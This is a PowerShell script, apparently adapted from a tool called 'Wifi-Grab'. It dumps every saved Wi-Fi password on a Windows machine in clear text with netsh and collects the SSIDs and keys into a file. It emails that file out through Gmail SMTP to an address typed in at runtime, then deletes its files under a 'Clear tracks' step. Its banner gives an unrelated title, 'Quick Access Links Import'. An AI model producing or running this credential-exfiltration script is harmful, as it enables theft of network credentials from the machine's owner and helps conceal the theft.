 <#
    .SYNOPSIS

        This function can be used to export all Wifi
        credentials to a .txt file and then have
        that file emailed out to an address of your
        choice.


    .PARAMETERS

        $PATH
            Pathway used where all files will be temporarily stored.
        
        $FROM
            The email address that will be sending the email.

        $PASS
            The password for the email address used above.

        $TO
            Recipient address.

        $PC_NAME
            Name of the device the script runs on.

        $SUBJECT
            Subject of the email.

        $BODY
            Body of the email.

        $ATTACH
            File name to attach to email.


    .NOTES

        Ensure that Less Secure Apps has been turned
        on for the email account being used to send
        the .txt file.


    .INFORMATION

        Source: https://github.com/axel05869/Wifi-Grab
        Author: axel05869
#>



Write-Host "


    ███╗░░░███╗███████╗████████╗░█████╗░██╗░░░░░██╗░░░░░██╗███╗░░██╗░█████╗░░██████╗  ████████╗███████╗░█████╗░██╗░░██╗
    ████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░██║░░░░░██║████╗░██║██╔══██╗██╔════╝  ╚══██╔══╝██╔════╝██╔══██╗██║░░██║
    ██╔████╔██║█████╗░░░░░██║░░░███████║██║░░░░░██║░░░░░██║██╔██╗██║██║░░██║╚█████╗░  ░░░██║░░░█████╗░░██║░░╚═╝███████║
    ██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║░░░░░██║░░░░░██║██║╚████║██║░░██║░╚═══██╗  ░░░██║░░░██╔══╝░░██║░░██╗██╔══██║
    ██║░╚═╝░██║███████╗░░░██║░░░██║░░██║███████╗███████╗██║██║░╚███║╚█████╔╝██████╔╝  ░░░██║░░░███████╗╚█████╔╝██║░░██║
    ╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝╚═╝░░╚══╝░╚════╝░╚═════╝░  ░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝


    Title: Quick Access Links Import
    Author: Andrew Metallinos <andrew@metallinostech.com.au>
    Creation Date: 24/04/2022
    Revision Date: 25/04/2022
    Version: 1.0.1
    
        Original Source: https://github.com/axel05869/Wifi-Grab
        Author: axel05869

========================================
"



# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p



# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}



# Prompt to send email
$TO = Read-Host -Prompt "
----------------------------------------

Enter in an email address if you would like to email
all Wifi passwords in a .txt file and then press ENTER"



# Email output file
$FROM = "youremail@gmail.com"
$PASS = "youremailpassword"
$PC_NAME = "$env:computername"
$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
$ATTACH = "wifipass.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))



# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass
